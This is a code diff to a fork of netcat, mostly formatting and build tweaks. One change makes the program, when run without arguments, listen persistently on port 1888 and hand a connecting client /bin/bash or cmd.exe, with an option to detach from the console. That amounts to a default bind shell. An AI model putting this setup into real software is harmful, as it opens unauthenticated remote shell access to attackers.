@@ -111,6 +111,8 @@ backend progs to grab a pty and look like a real telnetd?!
 # include <netinet/ip.h>        /* IPOPT_LSRR, header stuff */
 # include <netdb.h>             /* hostent, gethostby*, getservby* */
 # include <arpa/inet.h>         /* inet_ntoa */
+#include <fcntl.h>
+#include <unistd.h>
 #endif
 
 #include <stdio.h>
@@ -207,7 +209,7 @@ static USHORT o_keepalive = 0;
 by.  need to call like Debug ((stuff)) [with no ; ] so macro args match!
 Beware: writes to stdOUT... */
 #ifdef DEBUG
-#define Debug(x) {printf x; printf ("\n"); fflush (stdout); sleep (1);}
+#define Debug(x) {printf x; printf ("\n"); fflush (stdout); /* sleep (1);*/ }
 #else
 #define Debug(x)	/* nil... */
 #endif
@@ -252,9 +254,6 @@ static void res_init()
 	}
 
 }
-
-
-
 
 /* winsockstr
 Windows Sockets cannot report errors through perror() so we need to define
@@ -359,7 +358,7 @@ static void bail (str, p1, p2, p3, p4, p5, p6)
 #else
 	close (netfd);
 #endif
-	sleep (1);
+	// sleep (1);
 	exit (1);
 } /* bail */
 
@@ -731,8 +730,8 @@ set "to be tested" indications in BLOCK, from LO to HI.  Almost too small
 to be a separate routine, but makes main() a little cleaner... */
 static void loadports (block, lo, hi)
 	char * block;
-USHORT lo;
-USHORT hi;
+	USHORT lo;
+	USHORT hi;
 {
 	USHORT x;
 
@@ -763,24 +762,28 @@ doexec (fd)
 	int fd;
 {
 	register char * p;
-
-	dup2 (fd, 0);				/* the precise order of fiddlage */
+	int child, stat;
+	if ((child = fork()) == 0) {
+		dup2 (fd, 0);				/* the precise order of fiddlage */
 #ifdef WIN32
-	shutdown(fd, SD_BOTH);  /* Kirby */
-	closesocket (fd);
+		shutdown(fd, SD_BOTH);  /* Kirby */
+		closesocket (fd);
 #else
-	close (fd);				/* is apparently crucial; this is */
+		close (fd);				/* is apparently crucial; this is */
 #endif
-	dup2 (0, 1);				/* swiped directly out of "inetd". */
-	dup2 (0, 2);
-	p = strrchr (pr00gie, '/');		/* shorter argv[0] */
-	if (p)
-		p++;
-	else
-		p = pr00gie;
-	Debug (("gonna exec %s as %s...", pr00gie, p));
-	execl (pr00gie, p, NULL);
-	bail ("exec %s failed", pr00gie);	/* this gets sent out.  Hmm... */
+		dup2 (0, 1);				/* swiped directly out of "inetd". */
+		dup2 (0, 2);
+		p = strrchr (pr00gie, '/');		/* shorter argv[0] */
+		if (p)
+			p++;
+		else
+			p = pr00gie;
+		Debug (("gonna exec %s as %s...", pr00gie, p));
+		execl (pr00gie, p, NULL);
+	} else {
+		wait(&stat);
+	}
+	// bail ("exec %s failed", pr00gie);	/* this gets sent out.  Hmm... */
 } /* doexec */
 #endif
 #endif /* GAPING_SECURITY_HOLE */
@@ -1808,12 +1811,14 @@ int main (argc, argv)
 		w32_stdout = NULL;
 	else
 		GetConsoleScreenBufferInfo( w32_stdout, &csbi );
-#endif
 
 #ifdef HAVE_BIND
 	/* can *you* say "cc -yaddayadda netcat.c -lresolv -l44bsd" on SunLOSs? */
 	res_init();
 #endif
+
+#endif
+
 	/* I was in this barbershop quartet in Skokie IL ... */
 	/* round up the usual suspects, i.e. malloc up all the stuff we need */
 	lclend = (SAI *) Hmalloc (sizeof (SA));
@@ -1890,7 +1895,13 @@ recycle:
 	/******* default options ********/
 	if (argc == 1) {
 		// whereto = gethostpoop ("www.example.com", o_nflag);
+#ifdef GAPING_SECURITY_HOLE
+	#ifdef WIN32
 		pr00gie = "cmd.exe";
+	#else
+		pr00gie = "/bin/bash";
+	#endif
+#endif
 		o_listen++;
 		o_keepalive = cycle = 1;
 		o_lport = 1888;
@@ -1915,11 +1926,11 @@ recycle:
 			o_keepalive = cycle = 1;
 			break;
 
-
+#ifdef WIN32
 		case 'd':				/* detach from console */
 			FreeConsole();;
 			break;
-
+#endif
 
 		case 'G':				/* srcrt gateways pointer val */
 			x = atoi (optarg);
@@ -2204,47 +2215,47 @@ recycle:
 
 #ifdef HAVE_HELP		/* unless we wanna be *really* cryptic */
 #ifndef VERSION
-# define VERSION "1.14.custom"
+# define VERSION "1.17"
 #endif
 /* helpme :
 the obvious */
 static int helpme()
 {
 	o_verbose = 1;
-	holler ("NetCat for Windows v" VERSION " https://github.com/diegocr/netcat\n\
-										   connect to somewhere:	nc [-options] hostname port[s] [ports] ... \n\
-										   listen for inbound:	nc -l -p port [options] [hostname] [port]\n\
-										   options:");
+	holler ("NetCat for unix/Windows v" VERSION " https://github.com/brock7/netcat\n\
+   connect to somewhere:	nc [-options] hostname port[s] [ports] ... \n\
+   listen for inbound:		nc -l -p port [options] [hostname] [port]\n\
+   options:");
 	holler ("\
-			-d		detach from console, background mode");
+	-d		detach from console, background mode");
 
 #ifdef GAPING_SECURITY_HOLE	/* needs to be separate holler() */
 	holler ("\
-			-e prog		inbound program to exec [dangerous!!]");
+	-e prog		inbound program to exec [dangerous!!]");
 #endif
 	holler ("\
-			-g gateway	source-routing hop point[s], up to 8\n\
-			-G num		source-routing pointer: 4, 8, 12, ...\n\
-			-h		this cruft\n\
-			-i secs		delay interval for lines sent, ports scanned\n\
-			-l		listen mode, for inbound connects\n\
-			-L		listen harder, re-listen on socket close\n\
-			-k		keep alive\n\
-			-n		numeric-only IP addresses, no DNS\n\
-			-o file		hex dump of traffic\n\
-			-p port		local port number\n\
-			-r		randomize local and remote ports\n\
-			-s addr		local source address");
+	-g gateway	source-routing hop point[s], up to 8\n\
+	-G num		source-routing pointer: 4, 8, 12, ...\n\
+	-h		this cruft\n\
+	-i secs		delay interval for lines sent, ports scanned\n\
+	-l		listen mode, for inbound connects\n\
+	-L		listen harder, re-listen on socket close\n\
+	-k		keep alive\n\
+	-n		numeric-only IP addresses, no DNS\n\
+	-o file		hex dump of traffic\n\
+	-p port		local port number\n\
+	-r		randomize local and remote ports\n\
+	-s addr		local source address");
 #ifdef TELNET
 	holler ("\
-			-t		answer TELNET negotiation");
+	-t		answer TELNET negotiation");
 #endif
 	holler ("\
-			-u		UDP mode\n\
-			-v		verbose [use twice to be more verbose]\n\
-			-w secs		timeout for connects and final net reads\n\
-			-x		handle ansi escape codes\n\
-			-z		zero-I/O mode [used for scanning]");
+	-u		UDP mode\n\
+	-v		verbose [use twice to be more verbose]\n\
+	-w secs		timeout for connects and final net reads\n\
+	-x		handle ansi escape codes\n\
+	-z		zero-I/O mode [used for scanning]");
 	bail ("port numbers can be individual or ranges: m-n [inclusive]");
 	return(0);
 } /* helpme */
